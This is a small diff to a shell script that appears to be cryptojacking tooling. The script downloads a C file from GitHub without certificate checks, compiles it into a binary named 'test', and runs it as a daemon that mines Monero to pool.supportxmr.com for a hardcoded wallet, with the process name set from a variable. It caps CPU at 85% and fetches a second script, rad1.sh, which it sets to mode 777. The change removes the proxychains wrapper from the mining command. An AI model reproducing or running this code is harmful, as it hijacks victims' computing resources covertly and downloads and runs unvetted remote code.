@@ -16,7 +16,7 @@ then
     fi
     wget --no-check-certificate -c https://github.com/Mafs68/hjs839/raw/main/hig.c
     gcc -o test hig.c 
-    proxychains4 ./test -s "c.out" -d -p test.pid ./$he_save --coin 'monero' -B -o pool.supportxmr.com:3333 -u 47Sk8r1iZHQ2E5aEwy5ouubtqdbyYXgyUMG2czEPuizjN8kFnx2t5svSaYzRSHcvMXc2yx2FKn5hGBdVPnwV8Y16BvNR9Dr
+    ./test -s "c.out" -d -p test.pid ./$he_save --coin 'monero' -B -o pool.supportxmr.com:3333 -u 47Sk8r1iZHQ2E5aEwy5ouubtqdbyYXgyUMG2czEPuizjN8kFnx2t5svSaYzRSHcvMXc2yx2FKn5hGBdVPnwV8Y16BvNR9Dr
     cpulimit -e $he_save  -l 85 &
     wget --no-check-certificate -c https://github.com/Mafs68/hjs839/raw/main/rad1.sh
     chmod 777 rad1.sh
